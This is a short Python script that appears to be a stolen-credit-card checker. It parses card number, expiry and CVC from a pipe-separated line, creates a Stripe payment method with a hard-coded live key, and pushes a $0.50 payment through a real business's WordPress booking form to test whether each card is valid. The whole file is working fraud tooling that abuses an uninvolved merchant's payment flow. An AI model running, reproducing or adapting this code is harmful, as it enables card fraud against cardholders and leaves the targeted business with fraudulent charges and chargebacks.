import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fcc3c01f5f2%3B+stripe-js-v3%2Fcc3c01f5f2%3B+card-element&key=pk_live_51Lhf5HIftWIIGalq31S3HotC0Pka2IkPNRjE9o4oyYB9eVnQdX8cZ7U6BkGY3q6wvaSuYkuLIbzMwiBo0MgVk4GR00izUvUHcj'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	headers = {
	    'authority': 'massachusettsapostilleservices.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://massachusettsapostilleservices.com',
	    'referer': 'https://massachusettsapostilleservices.com/book-now/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1745912943438',
	}
	
	data = 'data=__fluent_form_embded_post_id%3D4795%26_fluentform_3_fluentformnonce%3D7eab917e1c%26_wp_http_referer%3D%252Fbook-now%252F%26names%255Bfirst_name%255D%3D%26names%255Blast_name%255D%3D%26phone_1%3D%252B12174093040%26email%3Drodamuser08%2540gmail.com%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3DKrung%2520Thep%2520Maha%2520Nakhon%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26country-list_1%3DUS%26numeric_field%3D1%26dropdown%3DExpress%2520Apostille%26multi_select%255B%255D%3DWill%2520Pick%2520Up%2520(free)%26dropdown_1%3DNo%26datetime%3D%26description%3D%26custom-payment-amount%3D0.50%26payment_method_1%3Dstripe%26terms-n-condition%3D%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=3'
	
	r2 = requests.post(
	    'https://massachusettsapostilleservices.com/wp-admin/admin-ajax.php',
	    params=params,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
